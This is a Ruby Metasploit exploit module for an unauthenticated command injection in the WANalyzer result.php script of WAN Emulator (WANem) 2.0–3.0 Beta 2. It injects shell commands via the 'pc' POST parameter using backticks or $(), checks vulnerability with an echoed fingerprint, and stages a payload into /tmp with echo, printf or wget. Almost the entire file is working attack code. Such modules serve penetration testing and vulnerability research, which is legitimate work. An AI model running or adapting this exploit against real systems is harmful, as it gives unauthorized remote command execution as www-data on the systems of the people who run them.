##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'WAN Emulator WANalyzer Command Execution',
      'Description'    => %q{
        This module exploits a command injection vulnerability in the WANalyzer
        component of WAN Emulator (WANem) versions 2.0 to 3.0 Beta 2. The
        result.php script does not require authentication and calls shell_exec()
        with user supplied data from the 'pc' parameter resulting in arbitrary
        command execution as the www-data user.

        This module has been tested successfully on WANem versions 2.0, 2.3
        and 3.0 Beta 2.
      },
      'License'        => MSF_LICENSE,
      'Privileged'     => false,
      'Platform'       => 'linux', # Knoppix
      'Arch'           => ARCH_X86,
      'Author'         => 'Brendan Coles',
      'References'     =>
        [
          ['URL', 'https://itsecuritysolutions.org/2012-08-12-WANem-v2.3-multiple-vulnerabilities/'],
        ],
      'Payload'        =>
        {
          'Space'       => 2_000,
          'DisableNops' => true,
          'BadChars'    => "\x00\x22\x27\\",
        },
      'Targets'        =>
        [
          [ 'WANem 2', { 'CmdStagerFlavor' => [ :echo, :wget ] }],
          [ 'WANem 3', { 'CmdStagerFlavor' => [ :echo, :bourne, :printf, :wget ] }]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Aug 12 2012'
    ))
  end

  def execute_command(cmd, opts = {})
    vprint_status "Sending command: #{cmd}"

    if target.name.eql? 'WANem 2'
      post = { 'pc' => "`#{cmd}`" }
    elsif target.name.eql? 'WANem 3'
      post = { 'pc' => "$(#{cmd})" }
    end

    send_request_cgi({
      'method' => 'POST',
      'uri' => '/WANem/result.php',
      'vars_post' => post
    }, 10)
  end

  def check
    fingerprint = Rex::Text.rand_text_alphanumeric rand 6..10
    res = execute_command "echo #{fingerprint}"

    unless res
      vprint_error 'Connection failed'
      return CheckCode::Unknown
    end

    unless res.code == 200 && res.body.include?('WANalyzer')
      return CheckCode::Safe
    end

    unless res.body.include? fingerprint
      return CheckCode::Detected
    end

    CheckCode::Vulnerable
  end

  def exploit
    res = execute_cmdstager :linemax => 2_000, :temp => '/tmp'

    unless res
      vprint_error "#{peer} - No reply from server"
      return
    end

    unless res.code == 200
      fail_with Failure::UnexpectedReply, "Server responded with status code #{res.code}"
    end

    print_good "#{peer} - Payload sent successfully"
  end
end
